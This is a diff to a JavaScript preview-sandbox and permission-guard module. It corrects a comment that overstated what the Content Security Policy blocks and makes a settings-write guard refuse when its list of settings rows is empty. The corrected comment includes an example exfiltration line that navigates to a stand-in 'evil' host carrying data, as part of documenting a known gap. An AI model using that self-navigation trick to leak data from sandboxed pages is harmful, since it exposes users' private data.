@@ -27,8 +27,27 @@
 import { isControlPlaneTool } from "./tool-policy.mjs";
 import { viaOf, RUNTIME_CONTRACT } from "./runtime-core.mjs";
 
-// CSP goes FIRST in the child head: no network at all (connect-src 'none', no remote
-// script/img/font sources) — closes exfiltration on every host, incl. the browser viewer.
+// CSP goes FIRST in the child head: no network REQUESTS (connect-src 'none', no remote
+// script/img/font sources) — that closes fetch/XHR/img/font/frame egress on every host, incl.
+// the browser viewer.
+//
+// 🔴 It does NOT close exfiltration, and until 2026-07-31 these lines claimed it did — flatly,
+// and for every host. (The superseded sentence is quoted in full in the ledger, stopgap SG-22.
+// It is deliberately NOT quoted here: SG-22's removal criterion is a grep for that sentence, and
+// a correction that reproduces the words it corrects keeps the criterion red forever. A test you
+// can never satisfy is a test people learn to skip — the same trap that let a doc-facts exemption
+// go stale, where writing "this exemption never matched" was itself enough to make it match.)
+// CSP has no directive governing a document navigating
+// ITSELF, and `sandbox="allow-scripts"` withholds top/ancestor navigation, not self-navigation:
+// `location.href = "https://evil/?d=" + data` still leaves. Measured 2026-07-31 in Chrome 150
+// against this exact CSP — fetch blocked, img blocked, the navigation carried the payload.
+// Repro: `node test/rig-sandbox-exfil.mjs`. The authoritative account is the self-navigation
+// section of docs/security-model.md, which had this right all along while these lines did not.
+//
+// Worth reading the paragraph below with that in mind: it reasons correctly that `form-action`
+// is a NAVIGATION and therefore misses `default-src` — the same reasoning applies to
+// `location.href`, and simply was not carried across. Closing that one is a design job (a real
+// fix needs host support or a `navigate-to`-shaped capability), deliberately not this version.
 // The bare POLICY string is exported separately so a server that serves preview documents
 // can send the same policy as an HTTP header (the authoritative copy; the meta is self-defence).
 //
@@ -350,7 +369,26 @@ export function makeGuard(cfg) {
         // cross_collection_write. Bound-collection rows are guarded via coll; foreign ids
         // that match a known settings row are guarded via the settingsIds set.
         settingsGuard(coll);
-        if (io.settingsIds && io.settingsIds().has(ta.id)) settingsGuard("settings");
+        // 🔴 The set is EVIDENCE, and absent evidence is not evidence of absence.
+        //
+        // This used to read `if (io.settingsIds && io.settingsIds().has(ta.id))`, which quietly
+        // made the whole guard conditional on that set being populated. It is not a constant: the
+        // embedder builds it from a settings read at boot (shell-runtime.js), that read can fail,
+        // its catch repairs only the pref map, and the whole thing sits inside Promise.allSettled
+        // — so a failed read still mounts a fully working child whose settingsIds is empty. From
+        // then on `.has()` answered false for every id and `settings_write: false` protected
+        // nothing. Nothing threw, nothing logged, and every assertion around it stayed green,
+        // because they all supplied a populated set. (Measured 2026-07-29; the fifth shape of
+        // guard failure we hit that week — the predicate's DATA SOURCE being empty.)
+        //
+        // So: this guard's job is to RECOGNISE settings rows, and it can only do that job when it
+        // has the list. No list, or an empty one, means it cannot tell — and a guard that cannot
+        // tell must refuse, not wave through. The cost of that reading is bounded and points the
+        // safe way: an app that lacks settings_write cannot write FOREIGN ids during the window
+        // where settings has not loaded. Its own bound collection is untouched (guarded by `coll`
+        // above), and apps holding settings_write are unaffected entirely.
+        const known = io.settingsIds ? io.settingsIds() : null;
+        if (!known || known.size === 0 || known.has(ta.id)) settingsGuard("settings");
         if (caps.cross_collection_write !== true && !inScope(ta.id)) throw new Error("out of scope");
       }
       if (tn === "data_delete_item") confirmDelete();
